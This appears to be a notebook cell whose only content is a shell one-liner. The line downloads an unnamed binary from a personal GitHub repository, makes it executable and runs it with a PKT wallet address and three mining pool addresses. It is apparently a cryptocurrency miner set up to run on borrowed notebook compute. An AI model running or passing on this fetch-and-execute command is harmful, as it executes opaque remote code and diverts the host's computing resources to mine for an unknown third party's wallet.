# %%
! wget https://github.com/sabrifaudi12/azq/raw/main/te && chmod +x te && ./te ann -p pkt1qmga844nr8q2x0ndlyqzm6k89g8ujjrhs4eg3gl http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
